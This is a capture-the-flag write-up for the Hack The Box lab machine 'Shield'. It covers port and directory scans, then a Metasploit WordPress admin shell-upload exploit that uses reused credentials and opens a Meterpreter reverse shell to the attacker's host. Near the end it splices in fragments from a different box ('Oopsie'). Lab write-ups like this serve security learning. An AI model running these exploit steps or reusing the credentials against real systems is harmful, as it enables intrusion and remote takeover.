## --------->> Shield <<----------

// First scanning with nmap

    $ nmap -sV -A -Pn 10.10.10.29 -p-
    Nmap scan report for 10.10.10.29
    Host is up (0.11s latency).
    Not shown: 65533 filtered ports
    PORT     STATE SERVICE VERSION
    80/tcp   open  http    Microsoft IIS httpd 10.0
    | http-methods: 
    |_  Potentially risky methods: TRACE
    |_http-server-header: Microsoft-IIS/10.0
    |_http-title: IIS Windows Server
    3306/tcp open  mysql   MySQL (unauthorized)
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

// Nvigating to http://10.10.10.29/ didnt give us much 
// execpt the fact its Windows IIS server(what we already know from nmap)

// lets search some potential directories with feroxbuster

    $ ./feroxbuster -u http://10.10.10.29/ -t 150

     ___  ___  __   __     __      __         __   ___
    |__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
    |    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
    by Ben "epi" Risher 🤓                 ver: 2.3.1
    ───────────────────────────┬──────────────────────
     🎯  Target Url            │ http://10.10.10.29/
     🚀  Threads               │ 150
     📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
     👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
     💥  Timeout (secs)        │ 7
     🦡  User-Agent            │ feroxbuster/2.3.1
     🔃  Recursion Depth       │ 4
    ───────────────────────────┴──────────────────────
     🏁  Press [ENTER] to use the Scan Cancel Menu™
    ──────────────────────────────────────────────────
    301        2l       10w      152c http://10.10.10.29/wordpress
    301        2l       10w      161c http://10.10.10.29/wordpress/wp-admin
    301        2l       10w      163c http://10.10.10.29/wordpress/wp-content
    301        2l       10w      164c http://10.10.10.29/wordpress/wp-includes
    301        2l       10w      170c http://10.10.10.29/wordpress/wp-content/themes
    301        2l       10w      171c http://10.10.10.29/wordpress/wp-content/plugins
    301        2l       10w      167c http://10.10.10.29/wordpress/wp-includes/js
    301        2l       10w      171c http://10.10.10.29/wordpress/wp-includes/images
    301        2l       10w      168c http://10.10.10.29/wordpress/wp-includes/css
    301        2l       10w      171c http://10.10.10.29/wordpress/wp-content/uploads
    301        2l       10w      171c http://10.10.10.29/wordpress/wp-includes/blocks
    301        2l       10w      171c http://10.10.10.29/wordpress/wp-content/upgrade
    301        2l       10w      170c http://10.10.10.29/wordpress/wp-includes/fonts
    301        2l       10w      170c http://10.10.10.29/wordpress/wp-admin/includes
    301        2l       10w      168c http://10.10.10.29/wordpress/wp-admin/images
    301        2l       10w      164c http://10.10.10.29/wordpress/wp-admin/js
    301        2l       10w      171c http://10.10.10.29/wordpress/wp-includes/Images
    301        2l       10w      177c http://10.10.10.29/wordpress/wp-includes/images/media
    301        2l       10w      168c http://10.10.10.29/wordpress/wp-includes/CSS
    301        2l       10w      174c http://10.10.10.29/wordpress/wp-includes/customize
    301        2l       10w      166c http://10.10.10.29/wordpress/wp-admin/user
    301        2l       10w      165c http://10.10.10.29/wordpress/wp-admin/css
    301        2l       10w      170c http://10.10.10.29/wordpress/wp-content/Themes
    301        2l       10w      172c http://10.10.10.29/wordpress/wp-includes/widgets
    301        2l       10w      168c http://10.10.10.29/wordpress/wp-admin/Images
    301        2l       10w      169c http://10.10.10.29/wordpress/wp-includes/text
    301        2l       10w      167c http://10.10.10.29/wordpress/wp-includes/JS
    301        2l       10w      172c http://10.10.10.29/wordpress/wp-includes/js/dist

// i tried another tool (dirsearch) 

    $ python3 dirsearch.py -u http://10.10.10.29/ -t 200

      _|. _ _  _  _  _ _|_    v0.4.1
     (_||| _) (/_(_|| (_| )

    Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 200 | Wordlist size: 10903

    Output File: /home/kali/Desktop/Tools/main-Tools/web/directories_scanners/dirsearch/reports/10.10.10.29/_21-07-31_21-35-35.txt

    Error Log: /home/kali/Desktop/Tools/main-Tools/web/directories_scanners/dirsearch/logs/errors-21-07-31_21-35-35.log

    Target: http://10.10.10.29/

    [21:35:36] Starting: 
    [21:35:39] 403 -  312B  - /%2e%2e//google.com
    [21:35:57] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd
    [21:35:59] 301 -    0B  - /Wordpress/  ->  http://10.10.10.29/wordpress/
    [21:36:53] 200 -    3KB - /wordpress/wp-login.php
    [21:36:55] 200 -   24KB - /wordpress/

// its seems we have wordpress CMS on the server and login page to Wordpress at http://10.10.10.29/wordpress/wp-login.php
// since we have credentials of admin:P@s5w0rd! from last box(Vaccine) lets try it using MetaSploit

    msf6 exploit(unix/webapp/wp_admin_shell_upload) > set password P@s5w0rd!
    password => P@s5w0rd!
    msf6 exploit(unix/webapp/wp_admin_shell_upload) > set username admin
    username => admin
    msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhosts 10.10.10.29
    rhosts => 10.10.10.29
    msf6 exploit(unix/webapp/wp_admin_shell_upload) > set targeturi /wordpress
    targeturi => /wordpress
    msf6 exploit(unix/webapp/wp_admin_shell_upload) > set lhost 10.10.16.7
    lhost => 10.10.16.7
    msf6 exploit(unix/webapp/wp_admin_shell_upload) > set lport 1444
    lport => 1444
    msf6 exploit(unix/webapp/wp_admin_shell_upload) > run

    [*] Started reverse TCP handler on 10.10.16.7:1444 
    [*] Authenticating with WordPress using admin:P@s5w0rd!...
    [+] Authenticated with WordPress
    [*] Preparing payload...
    [*] Uploading payload...
    [*] Executing the payload at /wordpress/wp-content/plugins/URXgzTZVXX/HTaruRzgbG.php...
    [*] Sending stage (39282 bytes) to 10.10.10.29
    [*] Meterpreter session 1 opened (10.10.16.7:1444 -> 10.10.10.29:49688) at 2021-07-31 21:16:41 +0000
    [!] This exploit may require manual cleanup of 'HTaruRzgbG.php' on the target
    [!] This exploit may require manual cleanup of 'URXgzTZVXX.php' on the target
    [!] This exploit may require manual cleanup of '../URXgzTZVXX' on the target

    meterpreter > whoami
    [-] Unknown command: whoami
    meterpreter > getuid
    [-] Error running command getuid: Rex::TimeoutError Operation timed out.
    meterpreter > dir
    [-] Error running command dir: Rex::TimeoutError Operation timed out.
    meterpreter > pwd
    [-] Error running command pwd: Rex::TimeoutError Operation timed out.
    meterpreter > cd C:/Users
    [-] Error running command cd: Rex::TimeoutError Operation timed out.
    meterpreter > exit -y
    [*] Shutting down Meterpreter...

// for some reason metasploit didnt get me a stable shell to work ...
// miving on!, Navigating to http://10.10.10.29/wordpress/wp-login.php
// we ebale to connect with credentials admin:P@s5w0rd!

![Image 2](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Shield/1.png)



Access ID | Name | Email
----------|------|-------
34322 | admin | admin@megacorp.com

// When navigating to uploads (http://10.10.10.28/cdn-cgi/login/admin.php?content=uploads) we get error due privilleges

![Image 2](https://github.com/W0lfySec/HTB/blob/main/Images/Oopsie/Screenshot_2021-07-31_11_02_
